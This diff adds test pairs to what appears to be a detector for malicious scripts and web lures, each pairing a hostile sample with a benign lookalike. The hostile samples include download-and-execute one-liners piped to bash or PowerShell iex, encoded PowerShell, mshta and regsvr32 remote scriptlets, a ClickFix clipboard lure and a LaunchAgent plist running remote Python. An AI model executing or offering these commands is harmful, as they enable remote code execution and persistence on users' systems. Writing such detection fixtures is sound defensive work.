@@ -205,6 +205,52 @@ def pairs() -> list[tuple[str, bytes, bytes]]:
         ),
         ("script_chmod_execute", b"chmod +x setup.sh\n./setup.sh\n", b"chmod +x setup.sh\n"),
         (
+            "script_chmod_execute",
+            b"chmod 755 ./setup.sh && ./setup.sh\n",
+            b"chmod 755 /srv/www && systemctl restart nginx\n",
+        ),
+        (
+            "script_download_execute",
+            b"curl -sL https://example.invalid/x | sudo -E bash\n",
+            b"curl -LO https://example.invalid/kubectl | sudo tee /usr/local/bin/kubectl\n",
+        ),
+        (
+            "script_download_execute",
+            b"iex (irm https://example.invalid/x)\n",
+            b"irm https://example.invalid/api | ConvertFrom-Json\n",
+        ),
+        (
+            "script_encoded_powershell",
+            b"powershell -nop -ep unrestricted -enc " + encoded.encode() + b"\n",
+            b"powershell -ep unrestricted -File backup.ps1\n",
+        ),
+        (
+            "script_mshta_remote",
+            b'mshta vbscript:Execute("CreateObject(""WScript.Shell"")")\n',
+            b"mshta can run vbscript: URLs, which is why it is blocked.\n",
+        ),
+        (
+            "script_regsvr32_remote_scriptlet",
+            b"regsvr32 -s -n -u -i:https://example.invalid/a.sct scrobj.dll\n",
+            b"regsvr32 -s -i:C:\\x\\a.sct scrobj.dll\n",
+        ),
+        (
+            "web_clickfix_lure",
+            b"<p>Verification required. Open File Explorer and paste the command in the "
+            b"address bar.</p><script>navigator.clipboard.write("
+            b'[new ClipboardItem({"text/plain": b})]);</script>',
+            b"<button onclick='navigator.clipboard.writeText(url)'>Copy link</button>"
+            b"<p>Open File Explorer and paste the path into the address bar.</p>",
+        ),
+        (
+            "script_launchagent_shell",
+            b"<plist><dict><key>ProgramArguments</key><array><string>/usr/bin/python3</string>"
+            b"<string>-c</string><string>import urllib.request;exec(urllib.request.urlopen("
+            b"'https://example.invalid').read())</string></array></dict></plist>",
+            b"<plist><dict><key>ProgramArguments</key><array><string>/usr/bin/python3</string>"
+            b"<string>/Users/me/backup.py</string></array></dict></plist>",
+        ),
+        (
             "script_fetch_chmod_run",
             b"curl -fsSLo /tmp/u https://example.invalid/u && chmod +x /tmp/u && /tmp/u\n",
             b"curl -LO https://example.invalid/kubectl && chmod +x kubectl"
